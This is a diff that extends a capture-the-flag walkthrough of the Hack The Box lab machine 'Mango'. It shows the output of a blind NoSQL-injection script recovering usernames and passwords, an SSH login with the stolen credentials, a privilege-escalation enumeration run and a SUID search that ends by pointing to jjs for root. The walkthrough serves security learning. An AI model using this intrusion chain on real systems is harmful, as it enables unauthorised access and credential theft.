@@ -141,4 +141,161 @@ if __name__ == '__main__':
 
 // or you can using burpsuit to cracking the password
 
+root@kali:~# python mango.py 
+username start with character:a
+ad
+adm
+admi
+admin
+Found username: admin
+username start with character:m
+ma
+man
+mang
+mango
+Found username: mango
+Finished!
+t
+t9
+t9K
+t9Kc
+t9KcS
+t9KcS3
+t9KcS3\>
+t9KcS3\>\!
+t9KcS3\>\!0
+t9KcS3\>\!0B
+t9KcS3\>\!0B\#
+t9KcS3\>\!0B\#2
+Found admin's password: t9KcS3>!0B#2
+admin:t9KcS3>!0B#2
+h
+h3
+h3m
+h3mX
+h3mXK
+h3mXK8
+h3mXK8R
+h3mXK8Rh
+h3mXK8RhU
+h3mXK8RhU\~
+h3mXK8RhU\~f
+h3mXK8RhU\~f\{
+h3mXK8RhU\~f\{\]
+h3mXK8RhU\~f\{\]f
+h3mXK8RhU\~f\{\]f5
+h3mXK8RhU\~f\{\]f5H
+Found mango's password: h3mXK8RhU~f{]f5H
+mango:h3mXK8RhU~f{]f5H
+root@kali:~# 
+root@kali:~# 
+root@kali:~# 
+root@kali:~# ssh admin@10.10.10.162
+The authenticity of host '10.10.10.162 (10.10.10.162)' can't be established.
+ECDSA key fingerprint is SHA256:AhHG3k5r1ic/7nEKLWHXoNm0m28uM9W8heddb9lCTm0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.162' (ECDSA) to the list of known hosts.
+admin@10.10.10.162's password: 
+Permission denied, please try again.
+admin@10.10.10.162's password: 
+
+root@kali:~# ssh mango@10.10.10.162
+mango@10.10.10.162's password: 
+Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Fri Apr  3 07:26:49 UTC 2020
+
+  System load:  0.01               Processes:            103
+  Usage of /:   26.3% of 19.56GB   Users logged in:      1
+  Memory usage: 16%                IP address for ens33: 10.10.10.162
+  Swap usage:   3%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+122 packages can be updated.
+18 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Fri Apr  3 06:14:28 2020 from 10.10.14.28
+mango@mango:~$ 
+
+mango@mango:~$ bash l.sh
+
+#########################################################
+# Local Linux Enumeration & Privilege Escalation Script #
+#########################################################
+# www.rebootuser.com
+# version 0.982
+
+[-] Debug Info
+[+] Thorough tests = Disabled
+
+mango@mango:~$ find / -user root -perm -4000 2>/dev/null
+/bin/fusermount
+/bin/mount
+/bin/umount
+/bin/su
+/bin/ping
+/snap/core/7713/bin/mount
+/snap/core/7713/bin/ping
+/snap/core/7713/bin/ping6
+/snap/core/7713/bin/su
+/snap/core/7713/bin/umount
+/snap/core/7713/usr/bin/chfn
+/snap/core/7713/usr/bin/chsh
+/snap/core/7713/usr/bin/gpasswd
+/snap/core/7713/usr/bin/newgrp
+/snap/core/7713/usr/bin/passwd
+/snap/core/7713/usr/bin/sudo
+/snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/7713/usr/lib/openssh/ssh-keysign
+/snap/core/7713/usr/lib/snapd/snap-confine
+/snap/core/7713/usr/sbin/pppd
+/snap/core/6350/bin/mount
+/snap/core/6350/bin/ping
+/snap/core/6350/bin/ping6
+/snap/core/6350/bin/su
+/snap/core/6350/bin/umount
+/snap/core/6350/usr/bin/chfn
+/snap/core/6350/usr/bin/chsh
+/snap/core/6350/usr/bin/gpasswd
+/snap/core/6350/usr/bin/newgrp
+/snap/core/6350/usr/bin/passwd
+/snap/core/6350/usr/bin/sudo
+/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/6350/usr/lib/openssh/ssh-keysign
+/snap/core/6350/usr/lib/snapd/snap-confine
+/snap/core/6350/usr/sbin/pppd
+/usr/bin/newuidmap
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/newgidmap
+/usr/bin/run-mailcap
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/traceroute6.iputils
+/usr/bin/pkexec
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+mango@mango:~$ 
+
+// found "/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs"     
+// refer: https://gtfobins.github.io/gtfobins/jjs/
+
 
